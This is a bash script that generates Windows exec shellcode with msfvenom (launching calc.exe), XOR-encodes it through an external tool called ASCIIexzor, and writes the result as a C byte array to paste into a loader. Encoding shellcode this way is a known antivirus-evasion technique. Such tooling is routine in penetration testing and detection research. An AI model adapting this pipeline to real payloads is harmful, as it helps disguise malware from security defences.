#!/bin/bash

arch=""
varSRC=""
XOR_Key=""

usage() {

    echo -en "\nUsage: $(basename "$0") -a <arch> [ -v <optional varname> -k <optional xor key> (broken for the moment...) ]\n"
    exit 1

}

while getopts ":a:v:k:" opt; do
    case ${opt} in
        a)
            arch="$OPTARG"

            if [[ "${arch}" == "x64" ]];then 

                payload="windows/x64/exec"

            elif [[ "${arch}" == "x86" ]];then

                payload="windows/exec"

            else

                echo -en "\nThe arch ${arch} not recognized. The usables arch are : x86 and x64"
                exit

            fi
            ;;
        v)
            varSRC="$OPTARG"
            ;;
        k)
            XOR_Key="$OPTARG"
            ;;

        \?)
            echo -en "\nInvalid switch: -$OPTARG\n" 1>&2
            usage
            ;;
        :)
            echo -en "\nThe switch -$OPTARG needs an argument.\n" 1>&2
            usage
            ;;
    esac
done
shift $((OPTIND -1))

if [[ -z ${arch} ]];then

    usage

elif [[ ! -x "$(command -v ASCIIexzor)" ]];then 

    echo -en "\nThis script is meant to be used with ASCIIexzor..."
    exit

else 

    FinalEncryptShell=toPaste.txt
    msfShell=/tmp/msf.txt
    run="calc.exe"
    [[ -z ${varSRC} ]] && varSRC=encrypted_txt 
    [[ -f ${FinalEncryptShell} ]] && rm ${FinalEncryptShell} 
    [[ -f ${msfShell} ]] && rm ${msfShell}
    msfvenom -p "${payload}" CMD=${run} --platform windows -a "${arch}" -b "\x00" -i 0 -f c -o ${msfShell}
    hexShell=$(sed -z 's|unsigned char buf\[\]||;s|[\\x\x0A\x1B\x20\x22\x3B\x3D]||g' ${msfShell})
    
    if [[ -n "${XOR_Key}" ]];then

        ASCIIexzor -s "${hexShell}" -x "${XOR_Key}" >/dev/null 2>&1

    else

        ASCIIexzor -s "${hexShell}" >/dev/null 2>&1

    fi

    encryptedShell=$(sed "s/./'&',/g; s/,$//" /tmp/txtEncryptedASCII.txt | sed 's|\\|\\x5C|g;s|\^|\\x5E|g;s|\x20|\\x20|g;s|\x60|\\x60|g;s|\x7E|\\x7E|g;s|\x7F|\\x7F|g')
    echo "unsigned char ${varSRC}[] = {${encryptedShell}};" | dd of=${FinalEncryptShell} >/dev/null 2>&1
    echo -en "\nThe shellcode has been written in the txt file ${FinalEncryptShell}."
    [[ -n ${XOR_Key} ]] && echo -en "\nThe xor key is : ${XOR_Key}" || echo -en "\nThe xor key is : MySecretKey"

fi